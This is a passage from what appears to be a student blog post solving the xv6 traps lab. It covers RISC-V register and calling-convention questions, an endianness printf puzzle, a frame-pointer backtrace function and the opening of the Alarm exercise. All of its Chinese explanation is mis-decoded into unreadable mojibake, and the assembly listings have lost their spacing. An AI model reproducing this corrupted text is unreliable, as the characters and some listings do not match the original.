å‘½ä»¤å¯ä»¥å°†user/call.cæ–‡ä»¶è½¬åŒ–ä¸ºuser/call.asmæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x+<span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> g(x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, f(<span class="hljs-number">8</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸éš¾è§‚å¯Ÿå‡ºï¼š</p><ol><li><code>s0</code>å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¸º<code>fp</code>æˆ–å¸§æŒ‡é’ˆï¼‰ï¼šå®ƒç”¨äºä¿å­˜å½“å‰å‡½æ•°çš„å¸§æŒ‡é’ˆï¼Œå³æŒ‡å‘å½“å‰å‡½æ•°æ ˆå¸§çš„åŸºå€ã€‚åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œ<code>s0</code>å¯„å­˜å™¨é€šå¸¸è¢«ç”¨äºå­˜å‚¨ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§åŸºå€ï¼Œä»¥ä¾¿åœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤è°ƒç”¨è€…çš„æ ˆå¸§ã€‚</li><li><code>sp</code>å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¸ºå †æ ˆæŒ‡é’ˆï¼‰ï¼šå®ƒç”¨äºæŒ‡ç¤ºå½“å‰çš„æ ˆé¡¶ä½ç½®ï¼Œå³æ ˆæŒ‡é’ˆã€‚æ ˆæ˜¯ä¸€ç§åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡ã€å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå…¶ä»–ä¸´æ—¶æ•°æ®ã€‚åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ï¼Œæ ˆä¼šåŠ¨æ€å¢é•¿å’Œæ”¶ç¼©ï¼Œè€Œ<code>sp</code>å¯„å­˜å™¨ä¼šéšç€æ ˆçš„å˜åŒ–è€Œç§»åŠ¨ã€‚</li><li>a0ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶å…·æœ‰å­˜å‚¨è¿”å›å€¼çš„ç”¨é€”ï¼ˆä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3ï¼‰ã€‚a1å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨</li><li>få‡½æ•°è¢«å†…è”ä¼˜åŒ–ï¼Œæ²¡æœ‰æ–°å¼€è¾Ÿæ ˆå¸§ï¼Œå®ƒçš„å†…å®¹å’Œgå‡½æ•°ç›¸åŒ</li><li>raå¯„å­˜å™¨å­˜å‚¨å‡½æ•°çš„è¿”å›åœ°å€</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs asm">user/_call:     file format elf64-littleriscv<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;g&gt;:<br>#include &quot;kernel/param.h&quot;<br>#include &quot;kernel/types.h&quot;<br>#include &quot;kernel/stat.h&quot;<br>#include &quot;user/user.h&quot;<br><br>int g(int x) &#123;<br>   0:1141                addisp,sp,-16 #ç»™æ ˆæŒ‡é’ˆåˆ†é…å†…å­˜<br>   2:e422                sds0,8(sp) #ä¿å­˜s0å¯„å­˜å™¨çš„å€¼<br>   4:0800                addis0,sp,16 <br>  return x+3;<br>&#125;<br>   6:250d                addiwa0,a0,3 # a0æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3<br>   8:6422                lds0,8(sp)<br>   a:0141                addisp,sp,16<br>   c:8082                ret<br><br>000000000000000e &lt;f&gt;:<br>#få‡½æ•°è¢«å†…è”ä¼˜åŒ–ï¼Œæ²¡æœ‰æ–°å¼€è¾Ÿæ ˆå¸§ï¼Œå®ƒçš„å†…å®¹å’Œgå‡½æ•°ç›¸åŒ<br>int f(int x) &#123;<br>   e:1141                addisp,sp,-16<br>  10:e422                sds0,8(sp)<br>  12:0800                addis0,sp,16<br>  return g(x);<br>&#125;<br>  14:250d                addiwa0,a0,3<br>  16:6422                lds0,8(sp)<br>  18:0141                addisp,sp,16<br>  1a:8082                ret<br><br>000000000000001c &lt;main&gt;:<br><br>void main(void) &#123;<br>  1c:1141                addisp,sp,-16 # åˆå§‹åŒ–å·¥ä½œ<br>  1e:e406                sdra,8(sp)<br>  20:e022                sds0,0(sp)<br>  22:0800                addis0,sp,16<br>  printf(&quot;%d %d\n&quot;, f(8)+1, 13);<br>  24:4635                lia2,13<br>  26:45b1                lia1,12 # f(8)+1<br>  28:00000517          auipca0,0x0<br>  2c:79050513          addia0,a0,1936 # 7b8 &lt;malloc+0xea&gt;<br>  30:00000097          auipcra,0x0<br>  34:5e6080e7          jalr1510(ra) # 616 &lt;printf&gt;<br>  exit(0);<br>  38:4501                lia0,0<br>  3a:00000097          auipcra,0x0<br>  3e:274080e7          jalr628(ra) # 2ae &lt;exit&gt;<br><br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call to <code>printf</code>?</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">reg    |<span class="hljs-string"> name  </span>|<span class="hljs-string"> saver  </span>|<span class="hljs-string"> description</span><br><span class="hljs-string">-------+-------+--------+------------</span><br><span class="hljs-string">x0     </span>|<span class="hljs-string"> zero  </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> hardwired zero</span><br><span class="hljs-string">x1     </span>|<span class="hljs-string"> ra    </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> return address</span><br><span class="hljs-string">x2     </span>|<span class="hljs-string"> sp    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> stack pointer</span><br><span class="hljs-string">x3     </span>|<span class="hljs-string"> gp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> global pointer</span><br><span class="hljs-string">x4     </span>|<span class="hljs-string"> tp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> thread pointer</span><br><span class="hljs-string">x5-7   </span>|<span class="hljs-string"> t0-2  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">x8     </span>|<span class="hljs-string"> s0/fp </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register / frame pointer</span><br><span class="hljs-string">x9     </span>|<span class="hljs-string"> s1    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register</span><br><span class="hljs-string">x10-11 </span>|<span class="hljs-string"> a0-1  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments / return values</span><br><span class="hljs-string">x12-17 </span>|<span class="hljs-string"> a2-7  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments</span><br><span class="hljs-string">x18-27 </span>|<span class="hljs-string"> s2-11 </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved registers</span><br><span class="hljs-string">x28-31 </span>|<span class="hljs-string"> t3-6  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">pc     </span>|<span class="hljs-string">       </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> program counter</span><br></code></pre></td></tr></table></figure><p>a0ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶å…·æœ‰å­˜å‚¨è¿”å›å€¼çš„ç”¨é€”ï¼ˆä¹Ÿå³æ˜¯xï¼Œè¿”å›x+3ï¼‰ã€‚a1å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨</p><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p><p>ä»£ç <code>li    a1,12 </code>ç›´æ¥å°†f(8)+1çš„ç»“æœå­˜å…¥a1ä¸­ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨å‡½æ•°çš„è¿‡ç¨‹ï¼Œè¿™é‡Œå­˜åœ¨ç¼–è¯‘å™¨çš„ä¼˜åŒ–</p><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>At what address is the function <code>printf</code> located?</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">0000000000000616</span> &lt;printf&gt;:<br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-number">616</span>:<span class="hljs-number">711</span>d                addisp,sp,<span class="hljs-number">-96</span><br></code></pre></td></tr></table></figure><p>616</p><blockquote><p><code>jalr 1510(ra)</code>æŒ‡ä»¤ç”¨äºè°ƒç”¨<code>printf</code>å‡½æ•°ï¼Œå…¶ä¸­åç§»é‡1510æ˜¯ç›¸å¯¹äºå…¨å±€åœ°å€0x0<strong>çš„åç§»</strong>ã€‚ï¼ˆå…¨å±€åœ°å€ä¸ç¡®å®šï¼‰</p></blockquote><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>Run the following code.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> int i = <span class="hljs-number">0</span>x<span class="hljs-number">00646</span>c<span class="hljs-number">72</span>;<br><span class="hljs-attribute">printf</span>(<span class="hljs-string">&quot;H%x Wo%s&quot;</span>, <span class="hljs-number">57616</span>, &amp;i);<br>    <br></code></pre></td></tr></table></figure><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Hereâ€™s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Hereâ€™s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>57616æ˜¯0xE110</p><p>%sæ‰“å°å‡º&amp;iæŒ‡å‘åå…­è¿›åˆ¶æ•°å¯¹åº”çš„ASCIIç ï¼Œé‡0åœæ­¢æ‰“å°ã€‚å˜é‡<code>i</code>å­˜å‚¨äº†å­—ç¬¦ä¸²â€rld\0â€</p><p>æœ€ç»ˆæ‰“å°å‡ºHE110 World</p><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;x=%d y=%d&quot;</span>, <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>y=a2å¯„å­˜å™¨çš„å€¼</p><p>è¿™é‡Œprintfå‡½æ•°ç›¸å½“äºæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼ˆa0ä¿å­˜ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯3ï¼ˆa1ä¿å­˜ï¼‰ï¼Œç¬¬ä¸‰ä¸ªï¼ˆï¼ˆa2ä¿å­˜ï¼‰ï¼‰</p><h2 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">moderate</a>)</h2><p>è¦æ±‚ï¼š<strong>åœ¨ kernel/printf.c ä¸­å®ç°ä¸€ä¸ª backtrace ()å‡½æ•°ã€‚åœ¨ sys _ sleep ä¸­æ’å…¥å¯¹æ­¤å‡½æ•°çš„è°ƒç”¨ï¼Œç„¶åè¿è¡Œ bttestï¼Œå®ƒè°ƒç”¨ sys _ sleepã€‚ä½ çš„è¾“å‡ºåº”è¯¥å¦‚ä¸‹:</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">backtrace:</span><br><span class="hljs-number">0x000000080002cda</span><br><span class="hljs-number">0x000000080002bb6</span><br><span class="hljs-number">0x0000000080002898</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨åœ¨æ¯ä¸ªå †æ ˆå¸§ä¸­æ”¾å…¥ä¸€ä¸ªåŒ…å«è°ƒç”¨è€…å¸§æŒ‡é’ˆåœ°å€çš„å¸§æŒ‡é’ˆã€‚æ‚¨çš„å›æº¯åº”è¯¥ä½¿ç”¨è¿™äº›å¸§æŒ‡é’ˆæ¥éå†å †æ ˆï¼Œå¹¶åœ¨æ¯ä¸ªå †æ ˆå¸§ä¸­æ‰“å°ä¿å­˜çš„è¿”å›åœ°å€ã€‚</p><blockquote><p>è¡¥å……ä¸€ä¸‹åŸºç¡€çŸ¥è¯†ï¼š</p><p>æ ˆæŒ‡é’ˆï¼šspï¼ˆstack pointerï¼‰ï¼ŒæŒ‡å‘æ ˆçš„ä½åœ°å€</p><p>å¸§æŒ‡é’ˆï¼šfpï¼ˆframe pointerï¼‰ï¼ŒæŒ‡å‘æ ˆçš„é«˜åœ°å€</p><p>fp-8ï¼šè¿”å›åœ°å€</p><p>fp-16ï¼špreview fp</p><p>å†…æ ¸ä¼šä¸ºæ ˆåˆ†é…ä¸€é¡µçš„å†…å­˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ PGROUNDUPï¼ˆfpï¼‰å’Œ PGROUNDDOWNï¼ˆfpï¼‰å®šä½æ ˆçš„ä¸Šä¸‹è¾¹ç•Œï¼Œä»¥ç»ˆæ­¢å¾ªç¯</p></blockquote><p>å…·ä½“çš„æ ˆçš„å†…å­˜å¸ƒå±€å‚è€ƒlectureä¸­æ•™æˆæ‰‹ç”»å›¾</p><ul><li><p>å°†backtraceçš„åŸå‹æ·»åŠ åˆ° kernel/defs.hï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ sys _ sleep ä¸­è°ƒç”¨backtrace</p><ul><li>åœ¨defs.hä¸­æ·»åŠ <code>void backtrace(void);</code></li></ul></li><li><p>GCC ç¼–è¯‘å™¨å°†å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°çš„å¸§æŒ‡é’ˆå­˜å‚¨åœ¨å¯„å­˜å™¨ s0ä¸­ã€‚å‘ kernel/riscv.h æ·»åŠ ä»¥ä¸‹å‡½æ•°ï¼Œå¹¶åœ¨backtraceä¸­è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»å–å½“å‰å¸§æŒ‡é’ˆã€‚è¿™ä¸ªå‡½æ•°ä½¿ç”¨å†…è”æ¥è¯»å– s0ï¼š</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">static inline uint64<br>r_fp()<br>&#123;<br>  uint64 x;<br>  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );<br>  return x;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨printf.cæ–‡ä»¶ä¸­æ·»åŠ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint64 fp=r_fp();<span class="hljs-comment">//get fp </span><br>  uint64 up_addr=PGROUNDUP(fp);<span class="hljs-comment">//up bound</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;backtrace:\n&quot;</span>);<span class="hljs-comment">//fmt output </span><br>  <span class="hljs-keyword">while</span>(fp&lt;up_addr)<br>  &#123;<br>    uint64 ret_addr=*(uint64 *)(fp<span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,ret_addr);<span class="hljs-comment">// attention that after %p is \n</span><br>    fp=*(uint64 *)(fp<span class="hljs-number">-16</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bttest.cä¸­å¦‚æ˜¯å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å› æ­¤bttestä½œä¸ºæµ‹è¯•æ–‡ä»¶ä¼šè°ƒç”¨sleepï¼Œä¹Ÿå³æ˜¯sys_sleepã€‚æˆ‘ä»¬åœ¨sys_sleepä¸­åŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint ticks0;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  acquire(&amp;tickslock);<br>  ticks0 = ticks;<br>  <span class="hljs-keyword">while</span>(ticks - ticks0 &lt; n)&#123;<br>    <span class="hljs-keyword">if</span>(myproc()-&gt;killed)&#123;<br>      release(&amp;tickslock);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    sleep(&amp;ticks, &amp;tickslock);<br>  &#125;<br>  release(&amp;tickslock);<br>  backtrace();<span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œsleepè¿”å›ä¹‹å‰ä¼šè°ƒç”¨backtraceå‡½æ•°</p><p>ç±»ä¼¼çš„ï¼Œä¸ºäº†æ›´å¥½çš„debugï¼Œåœ¨panicå‡½æ•°ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">panic</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  pr.locking = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;panic: &quot;</span>);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  backtrace();<br>  panicked = <span class="hljs-number">1</span>; <span class="hljs-comment">// freeze uart output from other CPUs</span><br>  <span class="hljs-keyword">for</span>(;;)<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼šåœ¨panicè¾“å‡ºä¹‹åï¼Œæ‰“å°å‡ºè¿”å›åœ°å€</p><blockquote><p>ps ï¼šåšåˆ°æ­¤å¤„å‘ç°äº†çš„qemuå¡æ­»çš„é—®é¢˜ï¼Œå‘ç°æ˜¯2020ç‰ˆæœ¬labçš„ä¼ ç»Ÿè‰ºèƒ½ã€‚apt remove qemu*ä¹‹åä½¿ç”¨æºç ç¼–è¯‘qemu5ç‰ˆæœ¬å³å¯</p><p>Next, retrieve and extract the source for QEMU 5.1.0:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/download.qemu.org/qemu</span><span class="hljs-number">-5.1</span>.0.tar.xz<br><span class="hljs-variable">$ </span>tar xf qemu<span class="hljs-number">-5.1</span>.0.tar.xz<br></code></pre></td></tr></table></figure><p>Build QEMU for riscv64-softmmu:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-keyword">cd</span> qemu-5.1.0<br>$ <span class="hljs-string">./configure</span> <span class="hljs-params">--disable-kvm</span> <span class="hljs-params">--disable-werror</span> <span class="hljs-params">--prefix=/usr/local</span> <span class="hljs-params">--target-list=</span><span class="hljs-string">&quot;riscv64-softmmu&quot;</span><br>$ make<br>$ sudo make install<br>$ <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">hard</a>)</h2><p>ç›®æ ‡ï¼š</p><p>å‘ xv6æ·»åŠ ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå°†åœ¨è¿›ç¨‹ä½¿ç”¨ CPU æ—¶é—´æ—¶<strong>å‘¨æœŸæ€§</strong>å‘å‡ºè­¦æŠ¥ã€‚æ›´ä¸€èˆ¬åœ°è¯´ï¼Œå®ç°ç”¨æˆ·çº§ä¸­æ–­/é”™è¯¯å¤„ç†ç¨‹åºçš„åŸºæœ¬å½¢å¼; ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ä¸œè¥¿æ¥å¤„ç†åº”ç”¨ç¨‹åºä¸­çš„é¡µé¢é”™è¯¯ã€‚</p><p>hintï¼š</p><ul><li>æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨sigalarm(interval, handler)ï¼Œå¦‚æœåº”ç”¨ç¨‹åºè°ƒç”¨ sigAlarm (nï¼Œfn) ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºæ¶ˆè€—çš„æ¯ n ä¸ª CPU æ—¶é—´ä¹‹åï¼Œå†…æ ¸åº”è¯¥è°ƒç”¨åº”ç”¨ç¨‹åºå‡½æ•° fnã€‚å½“ fn è¿”å›æ—¶ï¼Œåº”ç”¨ç¨‹åºåº”è¯¥ä»åœæ­¢çš„åœ°æ–¹æ¢å¤</li><li>å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºè°ƒç”¨ sigAlarm (0,0) ï¼Œå†…æ ¸åº”è¯¥åœæ­¢ç”Ÿæˆå‘¨æœŸæ€§çš„alarmè°ƒç”¨</li><li>user/alarmtest.cæ˜¯æµ‹è¯•æ–‡ä»¶ï¼Œéœ€è¦å°†å…¶æ·»åŠ åˆ°makefileã€‚æ·»åŠ äº† sigAlarm å’Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒæ‰èƒ½æ­£ç¡®ç¼–è¯‘</li><li>å¯ä»¥åœ¨ user/alarmtest.asm ä¸­çœ‹åˆ° alarmtest çš„æ±‡ç¼–ä»£ç ï¼Œè¿™å¯èƒ½æœ‰åŠ©äºè°ƒè¯•</li><li>alarmtest ä¸­åœ¨ test0 è°ƒç”¨äº† sigalarm(2, periodic)ï¼Œè¦æ±‚å†…æ ¸å¼ºåˆ¶æ¯éš”2ä¸ªtickè°ƒç”¨ period () ï¼Œç„¶åspinä¸€æ®µæ—¶é—´</li></ul><p>test0ï¼šä¿®æ”¹å†…æ 